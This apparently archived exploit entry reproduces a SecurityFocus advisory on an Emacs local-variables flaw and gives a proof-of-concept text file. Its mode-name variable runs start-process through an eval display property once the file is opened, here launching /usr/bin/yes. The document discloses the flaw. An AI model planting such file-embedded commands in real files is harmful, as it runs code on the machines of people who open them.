@@ -1,0 +1,18 @@
+source: http://www.securityfocus.com/bid/15375/info
+
+Emacs is susceptible to an arbitrary command execution vulnerability with local variables. This issue is due to insufficient sanitization of user-supplied input.
+
+By modifying a text file to include local variables containing containing shell commands in an 'eval' statement, attackers may cause arbitrary commands to be executed.
+
+This vulnerability allows an attacker to execute arbitrary commands with the privileges of the emacs user. This gives an attacker the ability to gain remote access to computers running the vulnerable software.
+
+/* -*- Mode: text; tab-width:20; Eval: Mode -*- -*- forms -*- */
+
+Emacs better than windoze.
+
+;;; Local Variables: ***
+;;; mode: text ***
+;;; mode-name: #("Microsoft sux" 0 4 (display (when (eval (start-process "/usr/bin/yes" "/usr/bin/yes" "/usr/bin/yes" "msux") ) . xxx) ) ) ***
+;;; comment-start: ";;; " ***
+;;; comment-end:"***" ***
+;;; End: *** 
